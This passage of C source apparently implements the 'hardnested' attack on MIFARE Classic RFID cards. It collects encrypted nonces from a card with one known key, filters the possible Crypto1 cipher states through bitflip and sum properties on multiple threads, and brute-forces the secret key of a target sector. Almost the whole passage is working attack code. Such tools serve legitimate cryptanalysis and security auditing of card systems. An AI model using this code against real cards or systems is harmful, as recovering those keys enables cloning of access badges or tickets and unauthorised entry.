        uint32_t mask = masks[odd_even][num_common];
        bool found_match = false;
        for (uint8_t remaining_bits = 0; remaining_bits <= (~mask & 0xff); remaining_bits++) {
            if (remaining_bits_match(num_common, bytes_diff, state, (state & mask) | remaining_bits, odd_even)) {
                if (bitflips_match(byte2, (state & mask) | remaining_bits, odd_even, true)) {    
                    found_match = true;
                    break;
                }
            }
        }
        if (!found_match) {   
            if (known_target_key != -1 && state == test_state[odd_even]) {
                printf("all_bitflips_match() 1st Byte: %s test state (0x%06x): Eliminated. Bytes = %02x, %02x, Common Bits = %d\n",
                        odd_even == ODD_STATE ? "odd" : "even",
                        test_state[odd_even],
                        byte, byte2, num_common);
                if (failstr[0] == '\0') {
                    sprintf(failstr, "Other 1st Byte %s, all_bitflips_match(), no match", odd_even ? "odd" : "even");
                }
            }
            return false;
        }
    }

    return true;
}


static void bitarray_to_list(uint8_t byte, uint32_t *bitarray, uint32_t *state_list, uint32_t *len, odd_even_t odd_even) {
    uint32_t *p = state_list;
    for (uint32_t state = next_state(bitarray, -1L); state < (1 << 24); state = next_state(bitarray, state)) {
        if (all_bitflips_match(byte, state, odd_even)) {
            *p++ = state;
        }
    }
    // add End Of List marker
    *p = 0xffffffff;
    *len = p - state_list;
}


static void add_cached_states(statelist_t *candidates, uint16_t part_sum_a0, uint16_t part_sum_a8, odd_even_t odd_even) {
    candidates->states[odd_even] = sl_cache[part_sum_a0 / 2][part_sum_a8 / 2][odd_even].sl;
    candidates->len[odd_even] = sl_cache[part_sum_a0 / 2][part_sum_a8 / 2][odd_even].len;
    return;
}


static void add_matching_states(statelist_t *candidates, uint8_t part_sum_a0, uint8_t part_sum_a8, odd_even_t odd_even) {
    const uint32_t worstcase_size = 1 << 20;
    candidates->states[odd_even] = (uint32_t *) malloc(sizeof (uint32_t) * worstcase_size);
    if (candidates->states[odd_even] == NULL) {
        printf("Out of memory error in add_matching_states() - statelist.\n");
        exit(4);
    }
    uint32_t *candidates_bitarray = (uint32_t *) MALLOC_BITARRAY(sizeof (uint32_t) * worstcase_size);
    if (candidates_bitarray == NULL) {
        printf("Out of memory error in add_matching_states() - bitarray.\n");
        free(candidates->states[odd_even]);
        exit(4);
    }

    uint32_t *bitarray_a0 = part_sum_a0_bitarrays[odd_even][part_sum_a0 / 2];
    uint32_t *bitarray_a8 = part_sum_a8_bitarrays[odd_even][part_sum_a8 / 2];
    uint32_t *bitarray_bitflips = nonces[best_first_bytes[0]].states_bitarray[odd_even];

    BITARRAY_AND4(candidates_bitarray, bitarray_a0, bitarray_a8, bitarray_bitflips);

    bitarray_to_list(best_first_bytes[0], candidates_bitarray, candidates->states[odd_even], &(candidates->len[odd_even]), odd_even);
    if (candidates->len[odd_even] == 0) {
        free(candidates->states[odd_even]);
        candidates->states[odd_even] = NULL;
    } else if (candidates->len[odd_even] + 1 < worstcase_size) {
        candidates->states[odd_even] = realloc(candidates->states[odd_even], sizeof (uint32_t) * (candidates->len[odd_even] + 1));
    }
    FREE_BITARRAY(candidates_bitarray);


    pthread_mutex_lock(&statelist_cache_mutex);
    sl_cache[part_sum_a0 / 2][part_sum_a8 / 2][odd_even].sl = candidates->states[odd_even];
    sl_cache[part_sum_a0 / 2][part_sum_a8 / 2][odd_even].len = candidates->len[odd_even];
    sl_cache[part_sum_a0 / 2][part_sum_a8 / 2][odd_even].cache_status = COMPLETED;
    pthread_mutex_unlock(&statelist_cache_mutex);

    return;
}


static statelist_t *add_more_candidates(void) {
    statelist_t *new_candidates;
    if (candidates == NULL) {
        candidates = (statelist_t *) malloc(sizeof (statelist_t));
        new_candidates = candidates;
    } else {
        new_candidates = candidates;
        while (new_candidates->next != NULL) {
            new_candidates = new_candidates->next;
        }
        new_candidates = new_candidates->next = (statelist_t *) malloc(sizeof (statelist_t));
    }
    new_candidates->next = NULL;
    new_candidates->len[ODD_STATE] = 0;
    new_candidates->len[EVEN_STATE] = 0;
    new_candidates->states[ODD_STATE] = NULL;
    new_candidates->states[EVEN_STATE] = NULL;
    return new_candidates;
}


static void add_bitflip_candidates(uint8_t byte) {
    statelist_t *candidates1 = add_more_candidates();

    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        uint32_t worstcase_size = nonces[byte].num_states_bitarray[odd_even] + 1;
        candidates1->states[odd_even] = (uint32_t *) malloc(sizeof (uint32_t) * worstcase_size);
        if (candidates1->states[odd_even] == NULL) {
            printf("Out of memory error in add_bitflip_candidates().\n");
            exit(4);
        }

        bitarray_to_list(byte, nonces[byte].states_bitarray[odd_even], candidates1->states[odd_even], &(candidates1->len[odd_even]), odd_even);

        if (candidates1->len[odd_even] + 1 < worstcase_size) {
            candidates1->states[odd_even] = realloc(candidates1->states[odd_even], sizeof (uint32_t) * (candidates1->len[odd_even] + 1));
        }
    }
    return;
}


static bool TestIfKeyExists(uint64_t key) {
    struct Crypto1State *pcs;
    pcs = crypto1_create(key);
    crypto1_byte(pcs, (cuid >> 24) ^ best_first_bytes[0], true);

    uint32_t state_odd = pcs->odd & 0x00ffffff;
    uint32_t state_even = pcs->even & 0x00ffffff;

    uint64_t count = 0;
    for (statelist_t *p = candidates; p != NULL; p = p->next) {
        bool found_odd = false;
        bool found_even = false;
        uint32_t *p_odd = p->states[ODD_STATE];
        uint32_t *p_even = p->states[EVEN_STATE];
        if (p_odd != NULL && p_even != NULL) {
            while (*p_odd != 0xffffffff) {
                if ((*p_odd & 0x00ffffff) == state_odd) {
                    found_odd = true;
                    break;
                }
                p_odd++;
            }
            while (*p_even != 0xffffffff) {
                if ((*p_even & 0x00ffffff) == state_even) {
                    found_even = true;
                }
                p_even++;
            }
            count += (uint64_t) (p_odd - p->states[ODD_STATE]) * (uint64_t) (p_even - p->states[EVEN_STATE]);
        }
        if (found_odd && found_even) {
            num_keys_tested += count;
            hardnested_print_progress(num_acquired_nonces, "(Test: Key found)", 0.0, 0, targetBLOCK, targetKEY, true);
            crypto1_destroy(pcs);
            return true;
        }
    }

    num_keys_tested += count;
    hardnested_print_progress(num_acquired_nonces, "(Test: Key NOT found)", 0.0, 0, targetBLOCK, targetKEY, true);

    crypto1_destroy(pcs);
    return false;
}


static void init_book_of_work(void) {
    for (uint8_t p = 0; p < NUM_PART_SUMS; p++) {
        for (uint8_t q = 0; q < NUM_PART_SUMS; q++) {
            for (uint8_t r = 0; r < NUM_PART_SUMS; r++) {
                for (uint8_t s = 0; s < NUM_PART_SUMS; s++) {
                    book_of_work[p][q][r][s] = TO_BE_DONE;
                }
            }
        }
    }
}

static void
#ifdef __has_attribute
#if __has_attribute(force_align_arg_pointer)
__attribute__((force_align_arg_pointer))
#endif
#endif
* generate_candidates_worker_thread(void *args) {
    uint16_t *sum_args = (uint16_t *) args;
    uint16_t sum_a0 = sums[sum_args[0]];
    uint16_t sum_a8 = sums[sum_args[1]];
    bool there_might_be_more_work = true;
    do {
        there_might_be_more_work = false;
        for (uint8_t p = 0; p < NUM_PART_SUMS; p++) {
            for (uint8_t q = 0; q < NUM_PART_SUMS; q++) {
                if (2 * p * (16 - 2 * q) + (16 - 2 * p)*2 * q == sum_a0) {
                    for (uint8_t r = 0; r < NUM_PART_SUMS; r++) {
                        for (uint8_t s = 0; s < NUM_PART_SUMS; s++) {
                            if (2 * r * (16 - 2 * s) + (16 - 2 * r)*2 * s == sum_a8) {
                                pthread_mutex_lock(&book_of_work_mutex);
                                if (book_of_work[p][q][r][s] != TO_BE_DONE) { // this has been done or is currently been done by another thread. Look for some other work.
                                    pthread_mutex_unlock(&book_of_work_mutex);
                                    continue;
                                }

                                pthread_mutex_lock(&statelist_cache_mutex);
                                if (sl_cache[p][r][ODD_STATE].cache_status == WORK_IN_PROGRESS
                                        || sl_cache[q][s][EVEN_STATE].cache_status == WORK_IN_PROGRESS) { // defer until not blocked by another thread.
                                    pthread_mutex_unlock(&statelist_cache_mutex);
                                    pthread_mutex_unlock(&book_of_work_mutex);
                                    there_might_be_more_work = true;
                                    continue;
                                }

                                // we finally can do some work.
                                book_of_work[p][q][r][s] = WORK_IN_PROGRESS;
                                statelist_t *current_candidates = add_more_candidates();

                                // Check for cached results and add them first
                                bool odd_completed = false;
                                if (sl_cache[p][r][ODD_STATE].cache_status == COMPLETED) {
                                    add_cached_states(current_candidates, 2 * p, 2 * r, ODD_STATE);
                                    odd_completed = true;
                                }
                                bool even_completed = false;
                                if (sl_cache[q][s][EVEN_STATE].cache_status == COMPLETED) {
                                    add_cached_states(current_candidates, 2 * q, 2 * s, EVEN_STATE);
                                    even_completed = true;
                                }

                                bool work_required = true;

                                // if there had been two cached results, there is no more work to do
                                if (even_completed && odd_completed) {
                                    work_required = false;
                                }

                                // if there had been one cached empty result, there is no need to calculate the other part:
                                if (work_required) {
                                    if (even_completed && !current_candidates->len[EVEN_STATE]) {
                                        current_candidates->len[ODD_STATE] = 0;
                                        current_candidates->states[ODD_STATE] = NULL;
                                        work_required = false;
                                    }
                                    if (odd_completed && !current_candidates->len[ODD_STATE]) {
                                        current_candidates->len[EVEN_STATE] = 0;
                                        current_candidates->states[EVEN_STATE] = NULL;
                                        work_required = false;
                                    }
                                }

                                if (!work_required) {
                                    pthread_mutex_unlock(&statelist_cache_mutex);
                                    pthread_mutex_unlock(&book_of_work_mutex);
                                } else {
                                    // we really need to calculate something
                                    if (even_completed) { // we had one cache hit with non-zero even states
                                        sl_cache[p][r][ODD_STATE].cache_status = WORK_IN_PROGRESS;
                                        pthread_mutex_unlock(&statelist_cache_mutex);
                                        pthread_mutex_unlock(&book_of_work_mutex);
                                        add_matching_states(current_candidates, 2 * p, 2 * r, ODD_STATE);
                                        work_required = false;
                                    } else if (odd_completed) { // we had one cache hit with non-zero odd_states
                                        sl_cache[q][s][EVEN_STATE].cache_status = WORK_IN_PROGRESS;
                                        pthread_mutex_unlock(&statelist_cache_mutex);
                                        pthread_mutex_unlock(&book_of_work_mutex);
                                        add_matching_states(current_candidates, 2 * q, 2 * s, EVEN_STATE);
                                        work_required = false;
                                    }
                                }

                                if (work_required) { // we had no cached result. Need to calculate both odd and even
                                    sl_cache[p][r][ODD_STATE].cache_status = WORK_IN_PROGRESS;
                                    sl_cache[q][s][EVEN_STATE].cache_status = WORK_IN_PROGRESS;
                                    pthread_mutex_unlock(&statelist_cache_mutex);
                                    pthread_mutex_unlock(&book_of_work_mutex);

                                    add_matching_states(current_candidates, 2 * p, 2 * r, ODD_STATE);
                                    if (current_candidates->len[ODD_STATE]) {
                                        add_matching_states(current_candidates, 2 * q, 2 * s, EVEN_STATE);
                                    } else { // no need to calculate even states yet
                                        pthread_mutex_lock(&statelist_cache_mutex);
                                        sl_cache[q][s][EVEN_STATE].cache_status = TO_BE_DONE;
                                        pthread_mutex_unlock(&statelist_cache_mutex);
                                        current_candidates->len[EVEN_STATE] = 0;
                                        current_candidates->states[EVEN_STATE] = NULL;
                                    }
                                }

                                // update book of work
                                pthread_mutex_lock(&book_of_work_mutex);
                                book_of_work[p][q][r][s] = COMPLETED;
                                pthread_mutex_unlock(&book_of_work_mutex);
                            }
                        }
                    }
                }
            }
        }
    } while (there_might_be_more_work);
    return NULL;
}


static void generate_candidates(uint8_t sum_a0_idx, uint8_t sum_a8_idx) {
    // create mutexes for accessing the statelist cache and our "book of work"
    pthread_mutex_init(&statelist_cache_mutex, NULL);
    pthread_mutex_init(&book_of_work_mutex, NULL);

    init_statelist_cache();
    init_book_of_work();

    // create and run worker threads
    uint8_t num_core = num_CPUs();
    pthread_t* thread_id = (pthread_t*)malloc(sizeof(pthread_t) * num_core);
    uint16_t** sums = malloc(num_core * sizeof(*sums));
    for (uint8_t i = 0; i < num_core; i++)
        sums[i] = (uint16_t*)malloc(3 * sizeof(*sums[0]));

    for (uint16_t i = 0; i < num_core; i++) {
        sums[i][0] = sum_a0_idx;
        sums[i][1] = sum_a8_idx;
        sums[i][2] = i + 1;
        pthread_create(thread_id + i, NULL, generate_candidates_worker_thread, sums[i]);
    }

    // wait for threads to terminate:
    for (uint16_t i = 0; i < num_core; i++) {
        pthread_join(thread_id[i], NULL);
    }

    free(thread_id);

    maximum_states = 0;
    for (statelist_t *sl = candidates; sl != NULL; sl = sl->next) {
        maximum_states += (uint64_t) sl->len[ODD_STATE] * sl->len[EVEN_STATE];
    }

    for (uint8_t i = 0; i < NUM_SUMS; i++) {
        if (nonces[best_first_bytes[0]].sum_a8_guess[i].sum_a8_idx == sum_a8_idx) {
            nonces[best_first_bytes[0]].sum_a8_guess[i].num_states = maximum_states;
            break;
        }
    }

    for (uint8_t i = 0; i < num_core; i++)
        free(sums[i]);
    free(sums);

    update_expected_brute_force(best_first_bytes[0]);
    hardnested_print_progress(num_acquired_nonces, "Apply Sum(a8) and all bytes bitflip properties", nonces[best_first_bytes[0]].expected_num_brute_force, 0, targetBLOCK, targetKEY, true);
}


static void free_candidates_memory(statelist_t *sl) {
    if (sl == NULL)
        return;

    free_candidates_memory(sl->next);
    free(sl);
}


static void pre_XOR_nonces(void) {
    // prepare acquired nonces for faster brute forcing. 

    // XOR the cryptoUID and its parity
    for (uint16_t i = 0; i < 256; i++) {
        noncelistentry_t *test_nonce = nonces[i].first;
        while (test_nonce != NULL) {
            test_nonce->nonce_enc ^= cuid;
            test_nonce->par_enc ^= oddparity8(cuid >> 0 & 0xff) << 0;
            test_nonce->par_enc ^= oddparity8(cuid >> 8 & 0xff) << 1;
            test_nonce->par_enc ^= oddparity8(cuid >> 16 & 0xff) << 2;
            test_nonce->par_enc ^= oddparity8(cuid >> 24 & 0xff) << 3;
            test_nonce = test_nonce->next;
        }
    }
}


static bool brute_force(uint8_t trgBlock, uint8_t trgKey) {
    if (known_target_key != -1) {
        TestIfKeyExists(known_target_key);
    }
    return brute_force_bs(NULL, candidates, cuid, num_acquired_nonces, maximum_states, nonces, best_first_bytes, trgBlock, trgKey);
}


static uint16_t SumProperty(struct Crypto1State *s) {
    uint16_t sum_odd = PartialSumProperty(s->odd, ODD_STATE);
    uint16_t sum_even = PartialSumProperty(s->even, EVEN_STATE);
    return (sum_odd * (16 - sum_even) + (16 - sum_odd) * sum_even);
}


static void Tests() {

    if (known_target_key == -1)
        return;

    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        uint32_t *bitset = nonces[best_first_bytes[0]].states_bitarray[odd_even];
        if (!test_bit24(bitset, test_state[odd_even])) {
                printf("\nBUG: known target key's %s state is not member of first nonce byte's (0x%02x) states_bitarray!\n",
                          odd_even == EVEN_STATE ? "even" : "odd ",
                          best_first_bytes[0]);
        }
    }

    if (known_target_key != -1) {
        for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
            uint32_t *bitset = all_bitflips_bitarray[odd_even];
            if (!test_bit24(bitset, test_state[odd_even])) {
                printf("\nBUG: known target key's %s state is not member of all_bitflips_bitarray!\n",
                        odd_even == EVEN_STATE ? "even" : "odd ");
            }
        }
    }
}


static void Tests2(void) {

    if (known_target_key == -1)
        return;

    for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
        uint32_t *bitset = nonces[best_first_byte_smallest_bitarray].states_bitarray[odd_even];
        if (!test_bit24(bitset, test_state[odd_even])) {
      printf("\nBUG: known target key's %s state is not member of first nonce byte's (0x%02x) states_bitarray!\n",
      odd_even == EVEN_STATE ? "even" : "odd ",
      best_first_byte_smallest_bitarray);
    }
  }

  for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
  uint32_t *bitset = all_bitflips_bitarray[odd_even];
    if (!test_bit24(bitset, test_state[odd_even])) {
      printf("\nBUG: known target key's %s state is not member of all_bitflips_bitarray!\n",
      odd_even == EVEN_STATE ? "even" : "odd ");
    }
  }
}


static void set_test_state(uint8_t byte) {
    struct Crypto1State *pcs;
    pcs = crypto1_create(known_target_key);
    crypto1_byte(pcs, (cuid >> 24) ^ byte, true);
    test_state[ODD_STATE] = pcs->odd & 0x00ffffff;
    test_state[EVEN_STATE] = pcs->even & 0x00ffffff;
    real_sum_a8 = SumProperty(pcs);
    crypto1_destroy(pcs);
}


bool mfnestedhard(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_t trgBlockNo, uint8_t trgKeyType) {
    
    targetBLOCK = trgBlockNo;
    targetKEY = trgKeyType;
    
    hard_LOW_MEM = false; // TODO: Investigate should we enable hard_LOW_MEM
    
    char progress_text[80];
    cuid = t.authuid;

    srand((unsigned) time(NULL));
    brute_force_per_second = brute_force_benchmark();
    write_stats = false;
    start_time = msclock();
    print_progress_header();
    //sprintf(progress_text, "Brute force benchmark: %1.0f million (2^%1.1f) keys/s", brute_force_per_second / 1000000, log(brute_force_per_second) / log(2.0));
    //hardnested_print_progress(0, progress_text, (float) (1LL << 47), 0, targetBLOCK, targetKEY, true);
    if (!init_bitflip_bitarrays())
        return false;
    init_part_sum_bitarrays();
    init_sum_bitarrays();
    init_allbitflips_array();
    init_nonce_memory();
    update_reduction_rate(0.0, true);

    if (!acquire_nonces(blockNo, keyType, key, trgBlockNo, trgKeyType)) {
		free_bitflip_bitarrays();
        free_nonces_memory();
        FREE_BITARRAY(all_bitflips_bitarray[ODD_STATE]);
        FREE_BITARRAY(all_bitflips_bitarray[EVEN_STATE]);
        free_sum_bitarrays();
        free_part_sum_bitarrays();
        return false;
    }

    known_target_key = -1;

    Tests();

    free_bitflip_bitarrays();
    bool key_found = false;
    num_keys_tested = 0;
    uint32_t num_odd = nonces[best_first_byte_smallest_bitarray].num_states_bitarray[ODD_STATE];
    uint32_t num_even = nonces[best_first_byte_smallest_bitarray].num_states_bitarray[EVEN_STATE];
    float expected_brute_force1 = (float) num_odd * num_even / 2.0;
    float expected_brute_force2 = nonces[best_first_bytes[0]].expected_num_brute_force;
    if (expected_brute_force1 < expected_brute_force2) {
        hardnested_print_progress(num_acquired_nonces, "(Ignoring Sum(a8) properties)", expected_brute_force1, 0, trgBlockNo, trgKeyType, true);
        set_test_state(best_first_byte_smallest_bitarray);
        add_bitflip_candidates(best_first_byte_smallest_bitarray);
        Tests2();
        maximum_states = 0;
        for (statelist_t *sl = candidates; sl != NULL; sl = sl->next) {
            maximum_states += (uint64_t) sl->len[ODD_STATE] * sl->len[EVEN_STATE];
        }
        best_first_bytes[0] = best_first_byte_smallest_bitarray;
        pre_XOR_nonces();
        prepare_bf_test_nonces(nonces, best_first_bytes[0]);
        hardnested_print_progress(num_acquired_nonces, "Starting brute force...", expected_brute_force1, 0, trgBlockNo, trgKeyType, true);
        brute_force(trgBlockNo, trgKeyType);
        free(candidates->states[ODD_STATE]);
        free(candidates->states[EVEN_STATE]);
        free_candidates_memory(candidates);
        candidates = NULL;
    } else {
        pre_XOR_nonces();
        prepare_bf_test_nonces(nonces, best_first_bytes[0]);
        for (uint8_t j = 0; j < NUM_SUMS && !key_found; j++) {
            float expected_brute_force = nonces[best_first_bytes[0]].expected_num_brute_force;
            sprintf(progress_text, "(%d. guess: Sum(a8) = %" PRIu16 ")", j + 1, sums[nonces[best_first_bytes[0]].sum_a8_guess[j].sum_a8_idx]);
            hardnested_print_progress(num_acquired_nonces, progress_text, expected_brute_force, 0, trgBlockNo, trgKeyType, true);
            generate_candidates(first_byte_Sum, nonces[best_first_bytes[0]].sum_a8_guess[j].sum_a8_idx);
            hardnested_print_progress(num_acquired_nonces, "Starting brute force...", expected_brute_force, 0, trgBlockNo, trgKeyType, true);
            key_found = brute_force(trgBlockNo, trgKeyType);
            free_statelist_cache();
            free_candidates_memory(candidates);
            candidates = NULL;
            if (!key_found) {
                // update the statistics
                nonces[best_first_bytes[0]].sum_a8_guess[j].prob = 0;
                nonces[best_first_bytes[0]].sum_a8_guess[j].num_states = 0;
                // and calculate new expected number of brute forces
                update_expected_brute_force(best_first_bytes[0]);
            }
        }
    }

    free_nonces_memory();
    FREE_BITARRAY(all_bitflips_bitarray[ODD_STATE]);
    FREE_BITARRAY(all_bitflips_bitarray[EVEN_STATE]);
    free_sum_bitarrays();
    free_part_sum_bitarrays();
    return true;
}
